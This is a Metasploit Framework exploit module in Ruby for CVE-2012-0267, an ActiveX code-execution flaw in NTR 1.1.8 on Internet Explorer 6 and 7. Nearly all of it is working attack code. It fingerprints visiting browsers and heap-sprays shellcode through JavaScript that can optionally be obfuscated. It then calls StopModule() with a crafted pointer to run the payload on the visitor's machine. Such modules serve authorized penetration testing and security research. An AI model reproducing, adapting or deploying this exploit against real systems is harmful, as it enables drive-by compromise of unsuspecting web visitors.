##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::Remote::BrowserAutopwn

  autopwn_info({
    :ua_name    => HttpClients::IE,
    :ua_minver  => "6.0",
    :ua_maxver  => "7.0",
    :javascript => true,
    :os_name    => OperatingSystems::WINDOWS,
    :classid    => "{E6ACF817-0A85-4EBE-9F0A-096C6488CFEA}",
    :method     => "StopModule",
    :rank       => NormalRanking
  })


  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'NTR ActiveX Control StopModule() Remote Code Execution',
      'Description'    => %q{
          This module exploits a vulnerability found in the NTR ActiveX 1.1.8. The
        vulnerability exists in the StopModule() method, where the lModule parameter is
        used to dereference memory to get a function pointer, which leads to code execution
        under the context of the user visiting a malicious web page.
      },
      'Author'         =>
        [
          'Carsten Eiram', # Vulnerability discovery
          'juan vazquez' # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2012-0267' ],
          [ 'OSVDB', '78253' ],
          [ 'BID', '51374' ],
          [ 'URL', 'http://secunia.com/secunia_research/2012-2/' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
        },
      'Payload'        =>
        {
          'Space' => 1024,
          'DisableNops' => true,
          'BadChars'    => ""
        },
      'DefaultOptions'  =>
        {
          'InitialAutoRunScript' => 'migrate -f'
        },
      'Platform' => 'win',
      'Targets'        =>
        [
          # NTR ActiveX 1.1.8.0
          [ 'Automatic', {} ],
          [ 'IE 6 on Windows XP SP3', { 'Rop' => nil, 'Offset' => '0x5f4'} ],
          [ 'IE 7 on Windows XP SP3', { 'Rop' => nil, 'Offset' => '0x5f4'} ],
          [ 'IE 7 on Windows Vista',  { 'Rop' => nil, 'Offset' => '0x5f4'} ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Jan 11 2012',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])
      ], self.class
    )

  end

  def get_spray(t, js_code, js_nops)

    spray = <<-JS
    var heap_obj = new heapLib.ie(0x20000);
    var code = unescape("#{js_code}");
    var nops = unescape("#{js_nops}");

    while (nops.length < 0x80000) nops += nops;

    var offset = nops.substring(0, #{t['Offset']});
    var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);

    while (shellcode.length < 0x40000) shellcode += shellcode;
    var block = shellcode.substring(0, (0x80000-6)/2);

    heap_obj.gc();
    for (var z=1; z < 500; z++) {
      heap_obj.alloc(block);
    }

    JS

    return spray

  end

  def get_target(agent)
    #If the user is already specified by the user, we'll just use that
    return target if target.name != 'Automatic'
    if agent =~ /NT 5\.1/ and agent =~ /MSIE 6/
      return targets[1] #IE 6 on Windows XP SP3
    elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 7/
      return targets[2] #IE 7 on Windows XP SP3
    elsif agent =~ /NT 6\.0/ and agent =~ /MSIE 7/
      return targets[3] #IE 7 on Windows Vista SP2
    else
      return nil
    end
  end

  def on_request_uri(cli, request)

    agent = request.headers['User-Agent']
    print_status("User-agent: #{agent}")

    my_target = get_target(agent)

    # Avoid the attack if the victim doesn't have a setup we're targeting
    if my_target.nil?
      print_error("Browser not supported: #{agent}")
      send_not_found(cli)
      return
    end

    p = payload.encoded
    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(my_target.arch))
    js_nops = Rex::Text.to_unescape("\x0c"*4, Rex::Arch.endian(my_target.arch))
    js = get_spray(my_target, js_code, js_nops)

    js = heaplib(js, {:noobfu => true})

    if datastore['OBFUSCATE']
      js = ::Rex::Exploitation::JSObfu.new(js)
      js.obfuscate
    end

    address = 0x0c0c0c0c / 0x134

    html = <<-MYHTML
    <html>
    <body>
    <object classid='clsid:E6ACF817-0A85-4EBE-9F0A-096C6488CFEA' id='test'></object>
    <script>
    #{js}
    test.StopModule(#{address});
    </script>
    </body>
    </html>
    MYHTML

    html = html.gsub(/^\t\t/, '')

    print_status("Sending html")
    send_response(cli, html, {'Content-Type'=>'text/html'})
  end
end
